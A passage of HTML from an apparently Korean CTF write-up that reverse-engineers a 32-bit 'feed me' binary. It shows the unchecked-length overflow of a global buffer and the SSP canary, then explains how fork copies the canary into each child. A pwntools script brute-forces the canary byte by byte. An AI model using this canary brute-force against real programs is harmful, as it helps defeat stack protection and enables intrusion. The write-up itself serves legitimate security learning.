스택 프레임 포인터 사이에 랜덤한 값을 삽입한 후 함수 종료 지점에서 랜덤 값 변조 여부를 검사하는 것을 확인할 수 있기 때문이다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 44.99999999999999%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAAsTAAALEwEAmpwYAAAB40lEQVQozy2R2W7bMBBF9f+/1Jc+NG3QNE7l7HbiWLtpaqVkUhJFnUJyCVxwMDgzmLnjHY8NWdZQlpq67lFqRClH101oPTEMDil7gqBBiAYpW4pCo5Slba+cMRN979acl6YdcVRRFj1SDhhtsRbcNAOLWOEwaEiTimLlRnozYUdw7sosz1qHJ2SHyCtkacirmVZDZ0BdQA/guP6pUIi85FwoZOmo2xkzsvKNgmEAYxxevk2ptyGln5BvEuptSvE3xuxO9HuBPQj6XYbcRCvXvSac7iLO98laUz1EDGpkGEFrh5fuOsSh5sVPedvklMeKXtbXEdsLdBpzbolfOmRY8LVLOL4UqOSCFjVj3ix7ryuP49LwDG8HuH+eeNobZG0ZZtB2xv33RlsIUtgf4flDk8iaRs8YC8pMDNPVx+WAXrzvSHYtwYcgPAhkUFNGNVq2DNVlXgy9yG4OX1uXfbZT8Jm5cyxcETVOZcqpU+P6vHNzP7phnJ1XP8YUviD8WXL6I7FfAvuVQpZDmkNezHMoOT/EiI0g+lUQ3ebk25j+kOGinPFDMIsKO4N3+y3h4XvK4w/B003G7u686v23WDQv8fPNyQQP2Va+53+LfeVXn4V/CUvfxJV/iStfB4WvZefXavL/AQSOplOaUVvMAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./9.png\"\n        title=\"./9.png\"\n        src=\"/static/1557e68d838e34bd4d6a6448ba5a836f/37523/9.png\"\n        srcset=\"/static/1557e68d838e34bd4d6a6448ba5a836f/e9ff0/9.png 180w,\n/static/1557e68d838e34bd4d6a6448ba5a836f/f21e7/9.png 360w,\n/static/1557e68d838e34bd4d6a6448ba5a836f/37523/9.png 720w,\n/static/1557e68d838e34bd4d6a6448ba5a836f/f1d1f/9.png 739w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>카나리 체크 함수</p>\n<h2 id=\"sub_8048e42-read_byte-함수-분석\" style=\"position:relative;\"><a href=\"#sub_8048e42-read_byte-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D\" aria-label=\"sub_8048e42 read_byte 함수 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>sub_8048E42 [read_byte] 함수 분석</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 562px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 48.888888888888886%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAIAAAA7N+mxAAAACXBIWXMAAAsTAAALEwEAmpwYAAABJklEQVQoz5WQXW7CMBCEfbyeoAfsfSohQCCaSpQfhzhrJ3ackDj27laBFvWBVnQ0D6PRzsN+YvP2JE+b7bbOMrle77P30/YDAM7WpdpGa2N9sf32zyyapmRmIiRKRMiMiImI+AGJPD9l2etiUSyXZdclgPN6DXnuj7IxBp3jqmKtuSy5rtm5KRgzldPYVC/GPCtVAHQASeuoFBpDANS2BDAtq4rblokYkVP6CtO47wNzYOaUKEa+vMAh0DhiCBgjXXq8+4eoKjQm9f2oNa9WVBSYZTSbhf2+ltIDxKYZjkeHeGctyrJTymuNAGiM17q3drgBu4bf8IlhSFLifB6V6g+Hxvtwuybiv6mLouh2u0pK631yLuIVxWMSWgciHkcKYSI0DP/wJwI5QP42bNMnAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./10.png\"\n        title=\"./10.png\"\n        src=\"/static/7ca367a7e3dae4bb6313744d840d7e1b/6e88f/10.png\"\n        srcset=\"/static/7ca367a7e3dae4bb6313744d840d7e1b/e9ff0/10.png 180w,\n/static/7ca367a7e3dae4bb6313744d840d7e1b/f21e7/10.png 360w,\n/static/7ca367a7e3dae4bb6313744d840d7e1b/6e88f/10.png 562w\"\n        sizes=\"(max-width: 562px) 100vw, 562px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>sub_8048E42 함수</p>\n<ul>\n<li>지역 변수 <code class=\"language-text\">v1</code> 에 1 바이트씩 <code class=\"language-text\">read</code> 함수를 바탕으로 입력을 받는 것을 확인할 수 있다.</li>\n<li><code class=\"language-text\">v2</code> 변수는 read 함수의 파일의 사이즈 이며 결국 1을 반환하겠지만 만약 실패할시 프로세스를 종료하는 것을 확인할 수 있다.</li>\n<li>해당 함수의 반환 값은 사용자의 1 바이트 입력한 값이다.</li>\n</ul>\n<h2 id=\"sub_8048e7e-next_read-함수-분석\" style=\"position:relative;\"><a href=\"#sub_8048e7e-next_read-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D\" aria-label=\"sub_8048e7e next_read 함수 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>sub_8048E7E [next_read] 함수 분석</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 475px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 99.44444444444443%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAIAAAAC64paAAAACXBIWXMAAAsTAAALEwEAmpwYAAACGElEQVQ4y5VSbW7bMAz1AfZ/l9gZttP0FLvcMKD7UWAb0KBJliZp7MZKbEuW5I/I+iA5KG7Tbc2G7IEQCIEUH99T8uXmQ8o+rTL8PkkX63q+5LNl9W2Sfb19mMza6Y+P89XV7N4+PE6ni/fz1fX0vtkWJi9tXtrkMZsQrSAYIiQCIoTgEf0xJ6KSaHdMLFFKNJY9ISnLpVLvmuZGiKEoSikHpUkpqmtCJMDjCTE5AfEpEl5N0s3b3f463zrOg1LIOXFOjFHTUFWhEDDePHN5QSLErZRvtP5cFAPnoDVVVYw8j/OLIuZlOTb/iaQWad9fHQ4zpVzToDEkZeSsFPV9TKSMFIbhXLOUPqphKQQEQGMQEV/XnbuLtJ0QUFUgRFDK13UIAU7VJ23OIhHCG0NtO2RZ7xzQ/yApS5tl7WIhtltlLbWtDwFGe0b+p+GvWSSMHRjTShlrg3PkXAC4dH7cOYSok3PBGNpsorZFQYuFY0wfN/JdB10Hw0BVNXj/8nSidRiGsNmoprG7HW23w3rdp6kRInSd9Z6sBefQWvCe+t79ymu0Cjn38znt9zbPlVIGAP6m8G+0lYo+S4mMHTgPdW1DeNHp327HZgDiHIVArX3bhrr2F2qW1LUDwK6jrrNShqaJW+AlpEeftTbew/F7knPkPb729mwkZTkwptfrum1t20aftPaXTr6708ag1vFjax1DKS/lRfETwPiEG5owcBkAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./11.png\"\n        title=\"./11.png\"\n        src=\"/static/e0aeb0e45220599df0c1ea09acbb1147/466da/11.png\"\n        srcset=\"/static/e0aeb0e45220599df0c1ea09acbb1147/e9ff0/11.png 180w,\n/static/e0aeb0e45220599df0c1ea09acbb1147/f21e7/11.png 360w,\n/static/e0aeb0e45220599df0c1ea09acbb1147/466da/11.png 475w\"\n        sizes=\"(max-width: 475px) 100vw, 475px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>sub_8048E7E 함수</p>\n<ul>\n<li><code class=\"language-text\">read_byte</code> 함수의 반환 값을 a2 인자로 받고, a1의 인자는 전역 변수 v3를 받는다.</li>\n<li>read 함수를 바탕으로 전역 변수 v3의 버퍼 공간을 사용자의 입력값 즉 바이트를 길이 값으로 매개체 삼아 버퍼 공간을 채우는 사실을 알 수 있다.</li>\n<li>전역 v3의 버퍼 공간 32바이트를 넘어서는 값의 길이 검증이 없기 때문에 255 바이트까지 입력을 받을 수 있어  충분히 오버플로우가 가능한 것으로 보이지만 문제는 SSP 보호 기법으로 인해 일반적인 오버플로우가 불가능하다.</li>\n</ul>\n<h2 id=\"canary-분석\" style=\"position:relative;\"><a href=\"#canary-%EB%B6%84%EC%84%9D\" aria-label=\"canary 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>canary 분석</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 46.666666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAAsTAAALEwEAmpwYAAACIklEQVQoz02QSW/TUBhF8z9okzSTp2c79vOYeIznxCGtU0orhAoVG8T/X/H6XYQXiMXRle7i6uhOEr/CqXuAvysQJQ1Ma4f5QsN8ocBwWuRphzZNYfADZN2FpsdQ9QjMzcHcCncyx1yyMJNszCUbkzw54nn4DM/00BUdzvUZOx6Sw2zwoKZmd6RKKsizXVJ1RrMNo5vlmj4sVLrZMJrK+tjNVgpNlxuaePsKx8sAZnlIy3aEBzGY5RAPapR1A9cxoDENnCkwTQWapUCxGSTThsYsyMzEWlMx26iY+HGNj9cnGLaPKK9QHy+I85okZsBwmvc4jkWbaIIHnpDDWOhpJ6ykFFYYC7bNhCw5Yi1bYqFuxUzxxH+GLtKyQ9H22GcVGY4Pa5u9Z7vut2EfRFIOYusWYqn4IszOQtJjwdxC+Fkv7mRXOPtOGE4qJn5Uo394hGpyJEWL+nRBEOVYqwZ5UTvaa6aF0/2A+tRDNS18+fYG7geI8wLPX1+hqDp+/fiJ748vGAcv1yeYPEBWHVG2PaKsItvbwQ0b6u8fSTFsOl6u1PQXktiWXl7fyAkj4kFE7fmBVrJOp/NAaVbSJI1aXO8/gW89lIcWl/6KNDrAtTx4PEeZlgjjHM15GO8weIAgPkDSTEyXEmYreczbpYTpSsIkjTsMwxNcZ4cwSGBbHjYrFauFDM85oEgrqG6N1TaBE0Q4ND1Uw8btYvNv7G+OLGX8AfRdKnS5QDrtAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./12.png\"\n        title=\"./12.png\"\n        src=\"/static/d409dfd5dfc9ee807ee2c314a9b22ce1/37523/12.png\"\n        srcset=\"/static/d409dfd5dfc9ee807ee2c314a9b22ce1/e9ff0/12.png 180w,\n/static/d409dfd5dfc9ee807ee2c314a9b22ce1/f21e7/12.png 360w,\n/static/d409dfd5dfc9ee807ee2c314a9b22ce1/37523/12.png 720w,\n/static/d409dfd5dfc9ee807ee2c314a9b22ce1/302a4/12.png 1080w,\n/static/d409dfd5dfc9ee807ee2c314a9b22ce1/76a99/12.png 1117w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>카나리</p>\n<ul>\n<li>gdb를 바탕으로 카나리를  <code class=\"language-text\">gs:0x14</code>  가져와 스택상에 넣는 과정을 확인할 수 있다.</li>\n<li>중요한 사실은 32bit 카나리인 경우 값이 총 4바이트이며 상위 1 바이트가 무조건 널 바이트인 것을 확인할 수 있다.</li>\n<li>전역 변수 <code class=\"language-text\">v3</code> 과 카나리의 값은 각각 .bss 영역에 있고 32바이트 차이가 나기 떄문에 오버플로우를 발생시켜 카나리의 값을 임의로 변조시켜 brute-force를 통해 한 바이트씩 카나리의 값을 총 3 바이트를 알아낼 수 있다.</li>\n</ul>\n<h2 id=\"fork-분석\" style=\"position:relative;\"><a href=\"#fork-%EB%B6%84%EC%84%9D\" aria-label=\"fork 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>fork 분석</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 67.77777777777777%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAIAAACgpqunAAAACXBIWXMAAAsTAAALEwEAmpwYAAABwklEQVQoz2VRWZIaMQzt+58q3znBFJOhgF7ovb3KtiRbUw2ECUSl8s8r+W3VONq6XvpeG0PWsnNs7WNPJ9N1epq8MaT1O2otV+fz2vdwvcI8s9YSoxBJKSIiyxJOp7VpdNf5Zc53NGd5TnW5LF0HTQPDkIaBlBJjBEBikr6H49fYtn5eZVllmmXbHvel7FsBECLnXFJixJxzeX6sDbvICTOvLo06mfgPeGO2FrXmbeNtiyEQ0Q2/PWvn9EcPx87+/px/fYTTQDv080EFwPNchkGMyfI6Zomu1arRy9mE0e5OXqcyho9HOtd0XbcVVhWVSSbEXQIEVqacW+yNVqQ0GptMCEz0oKm8J6UIoCDmGJk536Tt2qxl75JW5J1gKiFQSvxE78c8DLntogvRQUhIP7L3enma03WyDu6JvFirtC5/PqVukvI65YDET8x72lYZJu/RYsb8lvUtMAohA9zqKiWX/FSlNXqPMWYPKZe81/hfVXI4yPmSRj05dDY6RH4yr6u0o97C4pJ10b+RV11XPg9y6YyKyiPw3nP565nrJn/Vtp02SLG8q95li7UCQLlwkcKciR6ZbRumVBAlJS67mXfP39TEK3pmCYcaAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./13.png\"\n        title=\"./13.png\"\n        src=\"/static/4673a9941ac072aa90d2fbdbdbb47ef4/37523/13.png\"\n        srcset=\"/static/4673a9941ac072aa90d2fbdbdbb47ef4/e9ff0/13.png 180w,\n/static/4673a9941ac072aa90d2fbdbdbb47ef4/f21e7/13.png 360w,\n/static/4673a9941ac072aa90d2fbdbdbb47ef4/37523/13.png 720w,\n/static/4673a9941ac072aa90d2fbdbdbb47ef4/f1d1f/13.png 739w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>frok 분석</p>\n<ul>\n<li>문제는 총 반복을 <code class=\"language-text\">0x31F</code> 를 반복하면서 <code class=\"language-text\">fork</code> 함수를 바탕으로 자식 프로세스를 생성하고 내부 로직이 끝나면 죽이고 생성하는 과정을 반복한다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 78.88888888888889%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAYAAAAWGF8bAAAACXBIWXMAAAsTAAALEwEAmpwYAAAEwklEQVQ4y0WTWVCTVxTHjwmtxajgjAuWdlAr0gcMfh8gNWwuRadqsZuFIqi1D860D+3UgttUrKTtCCKLyCokgYRAEAiERQgkKAMkkKWEEHaJKAiiAqJC+JKczhe7PNw59+X+5nfP+R8gvb3AD2BV0Lq1nFAWy5uzehUZunLl9hCX1SQB4Ewsfwv83lkOBMcPiJ07YPvuXRDgy4aPAVYGu60P4axfGxTi5PRh6BpX3wMAa8DXfYMbO50b5F6QnOFelH51iygj5V1B6jV33vVUsjRnKyHOAm9R5jIHMIAAn9271gZu3ezmWZJ1fAM/Jc2jKP26hzjz6saC5BubhDd+hO0ALqQkLyGxV4N8kx6T2hVY1N+NXIMKvcrzT3iW50NQbTGTBpLubrD/YJgLuLzt9nmztE8w3IsZ2jZM7byHwiEjnu6QPweflCvAruKfqX90Hx89m15Q9uiXHs88Xyg3D6JHafaxjeKbEFzJZ/qGBiwjjx5mAABg219w/G6tanR+FnUjQ4vqwT7LxPwcXtK3jUCUWg5hdyRx6icTuGCzUqYXM/Ylu41qeTyGvtWF0X41IjjxSMvwIdjgs80TENFxznQqu+Ysi/hw4aXV/Gre9tpKYVaf3gzft8vhSFNF3NjLOUREapFastN1YPYZBsqEMaGCVNi5e+/qHf5EyA5/IiAp6uRyGpigb9fQD9But1ptVht9rTAPmuGoogr23SmNU/1jaJx77jBUTjxAoqow6lzbNysOl/1K7uOe2rc3/uQnX1VcOgAAzJ/Vys5ZyyKOvX5pHX31wvaaojCTNmRL+cCu5MXRPeubmqCUA7324adPKOGICTdJcqKhqAQOK9JYCYjMy4jMOF3eCtrwWEtNV8/MNHbcH7K2DvXZhmaf4XnNPTP4VxcCKRXEFQ73Yqt5mOK3t9jpmjdowK1ludGeZVnAEiGcoG5DPKoBzr3pY6Syuqt1ahylBq1VqLpnU02N4y+dLWbwrxcDKeXHSkYHUDc+RpWoWu3G6UmKjsQHZbnRHpIc2FMnZIZXx0NwfTYNW/avoebpJDaYDNYag9ZmeDr1xtA3NxmIKkFsyWg/dk+OWyp0apvxyWMLf9j4HzC0TuzIIXEtHhyxmUeIapF10kDFoGmprkdPGWem8WxXyyi8D8Agy/MvJBm7sHigBxNb5SgZNuHv3XSwb8V43s77P9gAEP7ZIRYAOH/RXNlN9zlb14FpqrtI//B0W8MkkNs2b/ROS9rEEmZGOglSI1dJciIZvJRIJ15KBFtW6UrKJOBVUeTYZZLjB+w9HJdAzy3r3ivl7XTipcY4i25GsEqyIyD/WjSrMGMPcBKiYL/sbMB+WWxxhPxKwXfKRF5kU0LBKWWi6NPqi8ShqvMQLrvo2OWPvg4DVwAI5h6DsKrYnw7WnhMfb/4zP6b5j4KoZm7Rt4qryZA9IoczbbcuFGhqUaxtRJGmAQUdNSjUNeJ5teCHNKMMbhpkTCLQH47q0sCgVDPooXBVxf0iXSMWaxtRoKrFUo0cs7TVCILBZriiKT4p0TehVKewVOoVVJm60SLWNSJXV/Jlbv8dyDc1MMJrLsOR2t/ggfkBY/LhOGRopfVSnRKleuViubZpqaKrCW9payb+BimOzqLFV1s1AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./14.png\"\n        title=\"./14.png\"\n        src=\"/static/0984e284d6785593f7350f4e9f279057/37523/14.png\"\n        srcset=\"/static/0984e284d6785593f7350f4e9f279057/e9ff0/14.png 180w,\n/static/0984e284d6785593f7350f4e9f279057/f21e7/14.png 360w,\n/static/0984e284d6785593f7350f4e9f279057/37523/14.png 720w,\n/static/0984e284d6785593f7350f4e9f279057/6c745/14.png 893w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>fork 과정</p>\n<ul>\n<li>fork 함수를 바탕으로 부모 프로세스의 메모리 사이즈, 값을 그대로 복제하여 자식 프로세스를 생성한다.</li>\n<li>부모 프로세스가 수행하던 코드 영역까지 그대로 복사를 하며 호출 이후에 부모 영역, 자식 영역이 따로 생기는 것을 알 수 있으며 canary의 값 또한 그대로 복제가 되는 것을 확인할 수 있겠다.</li>\n<li>그렇다면은 반복을 돌면서 자식 프로세스가 생겨나도 brute-force 기법을 바탕으로 1 바이트씩 해당 카나리 값을 구할 수 있겠다.</li>\n</ul>\n<h1 id=\"해결-방안\" style=\"position:relative;\"><a href=\"#%ED%95%B4%EA%B2%B0-%EB%B0%A9%EC%95%88\" aria-label=\"해결 방안 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>해결 방안</h1>\n<h2 id=\"공격\" style=\"position:relative;\"><a href=\"#%EA%B3%B5%EA%B2%A9\" aria-label=\"공격 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>공격</h2>\n<h2 id=\"canary-brute-force\" style=\"position:relative;\"><a href=\"#canary-brute-force\" aria-label=\"canary brute force permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>canary brute-force</h2>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">canary <span class=\"token operator\">=</span> <span class=\"token string\">'\\x00'</span>\nbuf <span class=\"token operator\">=</span> p8<span class=\"token punctuation\">(</span><span class=\"token number\">0x90</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">0x20</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">get_canary</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">global</span> canary\n    <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"byte_%d\"</span><span class=\"token operator\">%</span>_<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xff</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"FEED ME!\\n\"</span><span class=\"token punctuation\">)</span>\n            len_byte <span class=\"token operator\">=</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span>\n            p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>len_byte<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>buf <span class=\"token operator\">+</span> canary <span class=\"token operator\">+</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            res <span class=\"token operator\">=</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'Child exit.\\n'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">if</span> <span class=\"token string\">'YUM'</span> <span class=\"token keyword\">in</span> res<span class=\"token punctuation\">:</span>\n                canary <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span>\n                log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"canary: \"</span><span class=\"token operator\">+</span>canary<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">'hex'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">break</span>\n    <span class=\"token keyword\">print</span> hexdump<span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span></code></pre></div>\n<ul>\n<li>널 바이트는 알기 때문에 하위 3바이트를 기점으로 잡아 한 바이트 별로 <code class=\"language-text\">0xFF</code> 번 돌면서 값을 알아낼 수 가 있으며 앞에서 <code class=\"language-text\">feedme</code> 함수가 제대로 반환이 되어 <code class=\"language-text\">YUM</code> 문자열이 출력이 되었더라면 카나리값과 동일하다는 것을 확인할 수 있고 그와 반대로는 계속해서 루틴을 돌면서 찾게 될 것이다.</li>\n</ul>\n<p><span\n      